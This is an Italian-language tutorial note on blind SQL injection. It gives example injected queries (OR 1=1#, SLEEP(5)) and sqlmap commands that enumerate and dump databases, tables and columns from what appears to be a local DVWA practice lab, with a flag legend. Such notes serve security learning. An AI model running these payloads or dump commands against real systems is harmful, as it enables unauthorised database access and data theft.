=======================================================================

 REQUISITI: UNA CONNESSIONE AD INTERNET, DATABASE

=======================================================================


 SQL INJECTION BLIND:	SFRUTTAMENTO DI UN INPUT NON CONTROLLATO
			ESEGUIRE QUERY DI UN CERTO TIPO NEL DATABASE,
			MA SENZA SAPERE A VISTA SE SONO STATE
			EFFETTIVAMENTE EFFICACI


 NON ESSENDO NESSUNA SANIFICAZIONE DELL'INPUT, POSSIAMO PROVVEDERE
 A CREARE ATTACCHI DI SQL INJECTION


	============================================================
	# ESEMPIO DI QUERY:
	SELECT nome FROM clienti WHERE username='INPUT'


	# ESEMPIO DI QUERY, PER CONTROLLARE LA SANIFICAZIONE INPUT:
	# AGGIUNGO UN APICE E SE DA UN ERROR NON E' SANIFICATO
	SELECT nome FROM clienti WHERE username='''

	You have an error in your SQL syntax...


	# ESEMPIO DI SQL INJECTION
	SELECT nome FROM clienti WHERE username=''
	OR 1=1#


	# ESEMPIO DI SQL INJECTION (BLIND)
	SELECT nome FROM clienti WHERE username='INPUT'
	AND SLEEP(5)#
	============================================================


 POSSIAMO USARE SQL MAP PER OTTENERE PIU' RISPOSTE:


	============================================================
	# INSTALLIAMO SQLMAP
	apt install sqlmap
	sqlmap -h
	sqlmap --h

	# USIAMO SQLMAP PER CERCARE DI OTTENERE INFORMAZIONI SU
	# DATABASES, BANNER DI DBMS E LO SCHEMA
	sqlmap -u "PATH/DELLA/REQUEST?VALORE=TRUE"
	--cookie="chiave=valore; chiave2=valore2"
	--dbs

	# ESEMPIO PRINCIPALE
	sqlmap -u "http://192.168.1.64/vuln/vulnerabilities/
	sqli_blind/?id=1&Submit=Submit"
	--cookie="chiave=valoresecurity=low; PHPSESSID=abcde1234"
	--dbs


	# UNA VOLTA TROVATI I DATABASE CON IL COMANDO PRECEDENTE,
	# POSSIAMO SPECIFICARNE UNO PER CERCARE LE SUE TABLE:
	sqlmap -u "http://192.168.1.64/vuln/vulnerabilities/
	sqli_blind/?id=1&Submit=Submit"
	--cookie="chiave=valoresecurity=low; PHPSESSID=abcde1234"
	-D nomedatabase --tables


	# UNA VOLTA TROVATO LE TABLES CON IL COMANDO PRECEDENTE,
	# POSSIAMO SPECIFICARNE UNA PER CERCARE LE SUE COLONNE:
	sqlmap -u "http://192.168.1.64/vuln/vulnerabilities/
	sqli_blind/?id=1&Submit=Submit"
	--cookie="chiave=valoresecurity=low; PHPSESSID=abcde1234"
	-D nomedatabase -T tabella --columns


	# CONCLUSO IL TUTTO, POSSIAMO STAMPARE A VIDEO I
	# I RISULTATI O SALVARLI SU UN FILE
	sqlmap -u "http://192.168.1.64/vuln/vulnerabilities/
	sqli_blind/?id=1&Submit=Submit"
	--cookie="chiave=valoresecurity=low; PHPSESSID=abcde1234"
	-D nomedatabase -T tabella -C colonna1,colonna2 --dump
	============================================================


LEGENDA:


	========================================================
	-u:		URL DA TESTARE
	--cookie:	COOKIE DA PORTARE DURANTE LA RICHIESTA
	--dbs:		ENUMARE I DBMS POSSIBILI
	-D:		DATABASE DA ATTACCARE
	-T:		TABELLA DA ATTACCARE
	-C:		COLONNE DA PORTARE
	--dump:		STAMPARE A VIDEO I RISULTATI
	========================================================	

=======================================================================